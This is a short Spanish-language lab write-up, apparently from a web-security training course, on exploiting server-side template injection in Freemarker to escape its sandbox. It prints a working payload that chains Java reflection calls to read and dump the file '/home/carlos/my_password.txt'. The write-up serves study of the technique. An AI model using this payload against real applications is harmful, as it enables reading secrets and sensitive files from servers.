En esta clase explotamos una SSTI en Freemarker dentro de un entorno supuestamente aislado. Usamos el objeto **product** como punto de entrada para encadenar métodos de Java como ‘**getClass()**‘, ‘**getProtectionDomain()**‘ y ‘**openStream()**‘ hasta acceder al archivo sensible ‘**/home/carlos/my_password.txt**‘.

Obtenemos su contenido como bytes ASCII y lo convertimos para resolver el laboratorio, demostrando que incluso los entornos con sandbox pueden ser vulnerables si no se aíslan correctamente los métodos de reflexión.

Solucion
aqui nos encontramos con el mismo de freemarker
![Pasted image 20250814203648.png](imagenes/Pasted image 20250814203648.png)
entonce nos vamos a buscar el payload
![Pasted image 20250814204301.png](imagenes/Pasted image 20250814204301.png)
y lo ideal una ves terminado de configurar el payload sera convertirlo ascii
(${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")})
![Pasted image 20250814204346.png](imagenes/Pasted image 20250814204346.png)
https://www.prepostseo.com/tool/decimal-to-ascii
![Pasted image 20250814204605.png](imagenes/Pasted image 20250814204605.png)
